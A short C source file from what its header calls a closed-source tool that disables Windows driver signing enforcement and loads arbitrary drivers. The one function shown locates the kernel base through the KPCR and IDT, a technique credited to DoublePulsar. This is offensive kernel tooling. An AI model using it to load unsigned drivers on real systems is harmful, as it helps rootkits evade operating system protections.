/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Gets the kernel base address using a
 * trick from DoublePulsar.
 *
**/

D_SEC( B ) PVOID PcrGetNtBase( VOID )
{
	ULONG_PTR		Ent = 0;
	ULONG_PTR		Ohi = 0;
	ULONG_PTR		Omi = 0;
	ULONG_PTR		Olo = 0;

	PKPCR			Pcr = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;

	/* Get KPCR & offsets! */
	Pcr = C_PTR( __readgsqword( FIELD_OFFSET( KPCR, Self ) ) );
	Ohi = U_PTR( Pcr->IdtBase->OffsetHigh );
	Omi = U_PTR( Pcr->IdtBase->OffsetMiddle );
	Olo = U_PTR( Pcr->IdtBase->OffsetLow );

	/* Calc NT ptr */
	Ohi = Ohi << 32;
	Omi = Omi << 16;
	Ent = Ohi + Omi + Olo;

	/* Decrement by page! */
	Dos = C_PTR( U_PTR( Ent &~ 0xFFF ) );

	/* Enumerate pages for signature! */
	do {
		Dos = C_PTR( U_PTR( Dos ) - 0x1000 );
	} 
	while ( Dos->e_magic != IMAGE_DOS_SIGNATURE );

	return C_PTR( Dos );
};
